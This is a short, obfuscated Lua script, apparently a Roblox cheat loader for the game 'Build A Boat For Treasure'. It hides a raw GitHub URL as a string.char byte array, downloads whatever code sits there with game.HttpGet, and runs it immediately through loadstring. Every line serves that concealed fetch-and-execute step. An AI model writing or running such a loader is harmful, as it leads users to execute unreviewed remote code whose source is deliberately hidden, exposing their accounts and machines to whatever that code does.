local _0x0000 = loadstring
local _0x0001 = game
local _0x0002 = game.HttpGet

_0x0000(_0x0002(_0x0001, string.char(
104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
84,72,65,78,65,75,82,73,84,50,48,49,48,47,66,117,105,108,100,45,65,45,66,111,97,116,45,70,111,114,45,84,114,101,97,115,117,114,101,
47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,66,117,105,108,100,37,50,48,65,37,50,48,66,111,97,116,37,50,48,70,111,
114,37,50,48,84,114,101,97,115,117,114,101,37,50,48,86,49
), true))()
